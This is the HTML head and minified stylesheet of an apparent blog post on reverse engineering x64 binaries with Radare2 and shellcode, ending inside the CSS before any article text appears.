<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)</title>
  <meta name='description' content='All things cyber'>

  <link rel="canonical" href="http://localhost:4000/reversing-radare-16">
  <link rel="alternate" type="application/rss+xml" title="Artik Blue" href="/feed.xml">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

  <!-- Ionicons -->
  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">

  <style>
  
      /*!------------------------------------------------------------------
[MAIN STYLESHEET]
-------------------------------------------------------------------*/.list-reset{list-style-type:none;margin:0;padding:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}/*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:30px}ul,ol,dd{margin-left:15px}ul li,ol li{margin-bottom:10px}.highlight{background:#161d25}.highlighter-rouge .highlight{background:#eef}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:teal}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:teal}.highlight .ni{color:purple}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:navy}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d14}.highlight .sc{color:#d14}.highlight .sd{color:#d14}.highlight .s2{color:#d14}.highlight .se{color:#d14}.highlight .sh{color:#d14}.highlight .si{color:#d14}.highlight .sx{color:#d14}.highlight .sr{color:#009926}.highlight .s1{color:#d14}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}.container{max-width:1270px;padding-left:15px;padding-right:15px;margin:0 auto}@media only screen and (max-width: 1300px){.container{max-width:1100px}}@media only screen and (max-width: 1130px){.container{max-width:1000px}}@media only screen and (max-width: 1024px){.container{max-width:740px}}@media only screen and (max-width: 768px){.container{max-width:540px}}@media only screen and (max-width: 576px){.container{max-width:380px}}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-15px;margin-right:-15px}.col{padding-left:15px;padding-right:15px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}img[data-action="zoom"]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:666;-webkit-transition:all 300ms;-o-transition:all 300ms;transition:all 300ms}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;background:#161d25;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;opacity:0;-webkit-transition:opacity 300ms;-o-transition:opacity 300ms;transition:opacity 300ms}.zoom-overlay-open .zoom-overlay{opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.animate{animation:animateElement cubic-bezier(0.3, 0.45, 0.45, 0.95) 0.75s;animation-duration:0.5s;animation-iteration-count:1;transition:transform .15s}@keyframes animateElement{0%{opacity:0;transform:translate(0px, 50px)}100%{opacity:1;transform:translate(0px, 0px)}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-size:18px;line-height:34px;border:10px solid #131212;color:#fff;background-color:#131212;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}body.dark .footer__head{background:#131212}@media only screen and (max-width: 768px){body.dark .footer__head{padding:40px}}@media only screen and (max-width: 576px){body.dark .footer__head{padding:30px}}body.dark .subscribe-form .subscribe-email{background:#161d25}@media only screen and (max-width: 576px){body{font-size:16px;line-height:29px;border-width:5px}}*::selection{color:#fff;background-color:rgba(0,112,255,0.8)}h1,h2,h3,h4,h5,h6{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:700;line-height:1.3;letter-spacing:-1px}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{position:relative;margin-top:30px;padding:25px 25px 15px 60px;font-size:30px;line-height:45px;font-weight:600;font-style:normal}blockquote::before{content:'\201C';position:absolute;top:0.35em;left:0.05em;font-size:3.5em;color:#0070ff}blockquote p{margin-bottom:10px}blockquote cite{display:inline-block;margin-top:7px;font-size:15px;font-style:normal;color:#ccc}blockquote cite:before{content:'\2014' '\00a0'}@media only screen and (max-width: 1024px){blockquote{font-size:24px;line-height:37px}}@media only screen and (max-width: 576px){blockquote{padding:38px 0 15px 35px;font-size:21px;line-height:31px}}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}img,.zoom-img-wrap{max-width:100%;height:auto;vertical-align:middle}img+em,.zoom-img-wrap+em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}img+em a,.zoom-img-wrap+em a{border-bottom:1px solid #fff}img+em a:hover,.zoom-img-wrap+em a:hover{color:#fff;border-color:#0070ff}a{text-decoration:none;color:#fff;transition:all 0.35s}a:hover{color:#fff}hr{display:block;height:1px;width:100px;margin:50px 0;border:0;background:#000}.wrapper-page{margin-bottom:70px}@media only screen and (max-width: 768px){.wrapper-page{margin-bottom:60px}}@media only screen and (max-width: 576px){.wrapper-page{margin-bottom:40px}}.button{display:inline-block;height:45px;padding:0 20px;font-size:15px;font-weight:700;border:none;outline:none;color:#fff;background:#0070ff;transition:all 0.35s;cursor:pointer}.button:hover{color:#fff;background:#0065e6}.lazy{opacity:0;transition:0.3s}.lazy.loaded{opacity:1}.top{position:fixed;bottom:40px;right:-100px;z-index:1;width:28px;height:40px;font-size:28px;line-height:40px;text-align:center;border-radius:6px;background-color:#161d25;color:#fff;cursor:pointer;transition:all .25s ease;box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.top:hover{color:#fff;background-color:#0070ff}.top.is-active{right:40px}@media only screen and (max-width: 768px){.top{bottom:25px}.top.is-active{right:30px}}.header{height:auto;border-bottom:1px solid #131212;background:#161d25;transition:all 0.35s}.header .header__overlay{position:fixed;top:0;right:0;bottom:0;left:0;z-index:15;background-color:rgba(17,17,17,0.7);cursor:pointer;opacity:0;visibility:hidden;transition:all 0.5s ease}@media only screen and (max-width: 1024px){.header .header__overlay.is-visible{opacity:1;visibility:visible}}.header__inner{position:relative;display:flex;align-items:center;min-height:80px}.logo__link{font-size:20px;line-height:26px;font-weight:700}.logo__link:hover{color:#0070ff}.logo__image{max-height:50px}.main-nav{margin-left:80px}@media only screen and (max-width: 1024px){.main-nav{position:fixed;top:0;left:inherit;right:-300px;bottom:0;transform:none;z-index:100;width:300px;height:100vh;padding:40px 30px 30px;border:10px solid #131212;transition:right 0.5s cubic-bezier(0.7, 0.4, 0, 1);background:#161d25}.main-nav.is-open{right:0}.main-nav .nav__list{width:100%}.main-nav .nav__list .nav__item{display:block;margin:0 10px}.main-nav .nav__list .nav__item:last-child{margin-right:10px}.main-nav .nav__list .nav__item .nav__link{display:block;padding:10px 0;font-size:16px;line-height:26px;font-weight:500}}@media only screen and (max-width: 576px){.main-nav{padding:20px 30px;border-width:5px}}.main-nav__box{display:flex;align-items:center}.main-nav__box .nav__icon-close{display:none;font-size:24px;text-align:right}.main-nav__box .nav__icon-close .ion-md-close{transition:all 0.35s;cursor:pointer}.main-nav__box .nav__icon-close .ion-md-close:hover{color:#0070ff}.main-nav__box .nav__title{display:none}@media only screen and (max-width: 1024px){.main-nav__box{display:block}.main-nav__box .nav__icon-close{display:block}.main-nav__box .nav__title{display:block;margin:0 10px 15px;padding-bottom:15px;font-size:24px;font-weight:700;color:#fff;border-bottom:1px solid #131212}}.nav__list .nav__item{display:inline-block;margin:0 20px}.nav__list .nav__item:last-child{margin-right:40px}.nav__list .nav__item .nav__link{font-size:15px;line-height:24px;font-weight:500}.nav__list .nav__item .nav__link:hover{color:#0070ff}.nav-buttons{display:flex;align-items:center;margin-left:auto;font-size:21px;color:#fff;cursor:pointer}.nav-buttons .nav__icon{transition:all 0.35s}.nav-buttons .nav__icon:hover{color:#0070ff}.nav-buttons .nav__icon:first-child{margin-right:15px}.nav-buttons .nav__icon-menu{display:none}@media only screen and (max-width: 1024px){.nav-buttons{margin-left:auto}.nav-buttons .nav__icon-menu{display:block}}.search{position:fixed;top:0;left:0;right:0;bottom:0;z-index:-1;transform:scale(0.95);overflow:auto;opacity:0;background:#131212;transition:all .25s ease}.search.is-visible{transform:scale(1);z-index:100;opacity:1;transition:all .25s ease}.search__box{width:50%;margin:0 auto;padding-top:140px}@media only screen and (max-width: 1024px){.search__box{width:80%;padding-top:100px}}.search__group{position:relative;margin-bottom:50px}.search__group .search__close{position:absolute;right:20px;top:17px;font-size:27px;line-height:40px;cursor:pointer;transition:all .2s}.search__group .search__close:hover{color:#0070ff}.search__group .search__text{width:100%;padding:20px;font-size:21px;line-height:31px;border:2px solid transparent;border-radius:4px;color:#fff;background:#161d25;outline:none;transition:all .2s}.search__group .search__text:focus{border-color:#0070ff}.search__group .search__text::placeholder{font-weight:500;color:#fff}.search__group .search__text::-ms-clear{display:none}.search-results-list .no-results{width:100%;font-size:21px;font-weight:600;text-align:center;color:#fff}.pagination{margin-top:40px}@media only screen and (max-width: 768px){.pagination{margin-top:30px}}@media only screen and (max-width: 576px){.pagination{margin-top:20px}}.pagination__inner{display:flex;justify-content:center;align-items:center}.pagination__list{display:flex;font-weight:600;height:40px;padding:0 20px;font-size:14px;line-height:40px;border-radius:3px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);color:#fff;background-color:#161d25}.pagination__count{display:inline-block;padding:0 15px;margin:0 15px;font-size:13px;border-left:1px solid rgba(255,255,255,0.1);border-right:1px solid rgba(255,255,255,0.1);color:#ccc}.pagination__next i,.pagination__prev i{font-size:13px}.pagination__next:hover,.pagination__prev:hover{color:#0070ff}.pagination__next.disabled,.pagination__prev.disabled{opacity:0.2;cursor:not-allowed;color:inherit}.pagination__next i{margin-left:4px}.pagination__prev i{margin-right:4px}.footer{padding-top:70px;background:#161d25}.footer .row .col{flex-grow:1}.footer .footer__inner{padding:60px 0;margin:0 60px 0;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.footer .footer__head{margin:0 -60px;padding:60px;background:#161d25;box-shadow:0 10px 40px rgba(0,0,0,0.07)}.footer .footer__content{padding:60px 0}@media only screen and (max-width: 1024px){.footer .row .col:last-child>.widget{margin-bottom:0}}@media only screen and (max-width: 768px){.footer{padding-top:60px}.footer .footer__inner{padding:0;margin:0;background-image:none}.footer .footer__head{margin:0;padding:0;box-shadow:none}}@media only screen and (max-width: 576px){.footer{padding-top:50px}}@media only screen and (max-width: 1024px){.widget{margin-bottom:30px}}@media only screen and (max-width: 576px){.widget{margin-bottom:40px}}.widget__head{margin-bottom:20px}.widget__head .widget__title{margin:0;font-size:24px;color:#fff}.widget-gallery{padding:0 35px}@media only screen and (max-width: 1024px){.widget-gallery{padding:0}}.recent-posts{position:relative;display:flex;margin-bottom:15px}.recent-posts:last-child{margin-bottom:0}.recent-posts__header{margin-right:15px}.recent-posts__image{position:relative;display:block;margin-right:15px;min-width:80px;height:80px;background-size:cover;background-position:center;background-repeat:no-repeat;background-color:#131212}.recent-posts__image img{position:absolute;top:0;width:100%;height:100%;object-fit:cover}.recent-posts__date{margin-bottom:5px;font-size:13px;line-height:16px;color:#ccc}.recent-posts__title{margin-bottom:0;font-size:17px;line-height:22px;font-weight:700}.recent-posts__title a{color:#fff}.recent-posts__title a:hover{color:#fff}.widget-subscribe .subscribe__inner{display:flex;flex-direction:column;justify-content:space-between}.widget-subscribe .subscribe__group{margin-bottom:20px}.widget-subscribe .subscribe__group .subscribe__title{margin-bottom:15px;color:#fff}.widget-subscribe .subscribe__group .subscribe__description{font-size:15px;line-height:22px;color:#ccc}.widget-subscribe .subscribe-form{position:relative;height:60px}.widget-subscribe .subscribe-form .subscribe-email{width:100%;height:100%;padding:20px;font-size:14px;line-height:19px;font-weight:500;color:rgba(255,255,255,0.8);border:2px solid #131212;background:transparent;transition:border-color .2s ease-in-out;outline:0}.widget-subscribe .subscribe-form .subscribe-email::placeholder{color:rgba(255,255,255,0.8)}.widget-subscribe .subscribe-form .subscribe-email:focus{color:rgba(255,255,255,0.8);border-color:#0070ff}.widget-subscribe .subscribe-form 